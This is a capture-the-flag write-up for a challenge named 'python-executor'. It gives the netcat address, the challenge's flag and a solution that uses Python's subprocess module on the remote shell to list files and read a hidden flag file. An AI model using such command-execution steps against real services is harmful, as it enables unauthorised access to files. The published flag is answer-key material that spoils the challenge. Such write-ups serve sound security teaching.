# python-executor


<br/>


## Challenge Description :

I made my own Python shell that executes valid Python syntax input statements and gives you the output. Try it out.

Connect to : `nc 35.244.42.91 1024`


<br/>


## Hint :

Example : `import <MODULE>; <MODULE>.run(["echo", "hello"])`

Replace `<MODULE>` with the appropriate module.


<br/>


## Flag :

`isfcr{3x3c_0r_5ubpr0c355_run?}`


<br/>


## Solution :

This challenge involves remote shell code execution using Python.

1. Using the hint, we figure out that the `<MODULE>` is the `subprocess` module.
2. Connect to the server and execute the example command : `import subprocess; subprocess.run(["echo", "hello"])`
    - We get the output `hello`. This tells us that we are able to execute Linux shell commands.
3. Let's try and list all the files in the directory : `import subprocess; subprocess.run(["ls", "-la"])`
    - We get the output :
        ```
        total 44
        dr-xr-xr-x 1 root root 4096 Apr 24 06:40 .
        drwxr-xr-x 1 root root 4096 Apr 24 05:03 ..
        -r-xr-xr-x 1 root root  220 Apr 23  2023 .bash_logout
        -r-xr-xr-x 1 root root 3526 Apr 23  2023 .bashrc
        -r-xr-xr-x 1 root root   30 Apr 24 06:38 .flag.txt
        -r-xr-xr-x 1 root root  807 Apr 23  2023 .profile
        -r-xr-xr-x 1 root root  290 Apr 24 06:38 Dockerfile
        -r-xr-xr-x 1 root root  776 Apr 24 06:38 README.md
        -r-xr-xr-x 1 root root  527 Apr 24 06:38 app.py
        ```
4. Let's read the contents of `.flag.txt` to get the flag : `import subprocess; subprocess.run(["cat", ".flag.txt"])`

